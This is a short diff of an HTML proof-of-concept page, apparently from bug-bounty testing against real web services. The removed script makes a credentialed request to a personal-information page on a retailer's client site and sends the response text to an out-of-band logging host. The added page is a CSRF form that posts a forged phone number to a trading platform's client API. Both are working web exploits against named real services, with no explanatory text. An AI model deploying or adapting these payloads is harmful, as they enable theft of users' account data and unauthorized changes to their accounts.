@@ -1,12 +1,10 @@
-<script>
-  document.domain='https://ahmadzdddd.github.io/ssssfd6-espace-client.leclercdrive.fr';
-  var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://fd6-espace-client.leclercdrive.fr/drive/magasin-097602-097602-Le-Havre---Docks-Vauban/mes-informations-personnelles.aspx',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    location='//orlrnjgifoxwnpbprwrvj5k2tdkpskjx2.oast.fun/log?key='+this.responseText; 
-};
-</script>
+<!DOCTYPE html>
+<html lang="en">
+	<body>
+		<h1>Form CSRF PoC</h1>
+		<form method="POST" action="https://my.tickmill.com/api/client/phone-numbers">
+			<input type="hidden" name="{%22countryCode%22:%22+33%22,%22number%22:%22644566201%22,%22isPrimary%22:false}" value="">
+			<input type="submit" value="Submit Request">
+		</form>
+	</body>
+</html>
